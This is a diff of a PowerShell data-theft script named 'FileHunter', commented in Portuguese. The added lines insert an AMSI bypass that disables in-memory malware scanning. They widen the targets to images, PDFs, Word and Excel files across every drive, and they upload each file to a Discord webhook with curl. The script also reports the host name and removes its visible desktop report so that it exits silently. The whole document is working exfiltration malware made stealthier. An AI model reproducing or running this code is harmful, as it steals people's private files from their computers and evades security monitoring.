@@ -1,28 +1,27 @@
-# PAYLOAD (.ps1) - FileHunter Staged Version
+# [Bypass AMSI] - Desativa a monitorização em tempo real na memória para este processo
+$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$a.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+
 $u = 'https://discord.com/api/webhooks/1484361195443196066/GoX9619rfnS7zha8MBZzXEdsReSFosFYFbtFyVfNPVxybJXyXVw7TkLPoj5M-g6nWaXX'
 
-# Alvos: Define aqui o padrão de ficheiro (ex: *.jpg, documentos.docx, etc)
-$e = @('example.jpg') # Podes adicionar mais: @('*.jpg','*.pdf')
+# Alvos: Ajustado para extensões comuns de interesse
+$e = @('*.jpg', '*.pdf', '*.docx', '*.xlsx') 
 
-# Notificação de início de varredura
-curl.exe -k -s -F ('payload=' + [char]64 + 'FileHunter iniciado no host: ' + $env:COMPUTERNAME) $u
+# Notificação via curl (nativo no Windows 10/11)
+curl.exe -k -s -F "content=FileHunter iniciado no host: $env:COMPUTERNAME" $u
 
-# Varredura de todas as unidades de sistema
 $found = New-Object System.Collections.Generic.List[string]
 Get-PSDrive -PSProvider FileSystem | ForEach-Object {
     $root = $_.Root
+    # Procura recursiva ignorando erros de permissão
     Get-ChildItem -Path $root -Include $e -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {
         if ($_.Length -lt 24MB) {
-            # Exfiltração imediata para evitar perda de dados se o processo for interrompido
-            $a = 'file=' + [char]64 + $_.FullName
-            curl.exe -k -s -F $a $u
+            # Upload direto para o Discord
+            $arg = 'file=@' + $_.FullName
+            curl.exe -k -s -F $arg $u
             $found.Add($_.Name)
         }
     }
 }
 
-# Relatório final no Ambiente de Trabalho (mantendo a lógica do script original)
-$msg = "A auditoria de ficheiros terminou. Encontrados: " + $found.Count
-Set-Content -Path "$env:USERPROFILE\Desktop\fyi.txt" -Value $msg
-
+# Limpeza e saída silenciosa
 exit
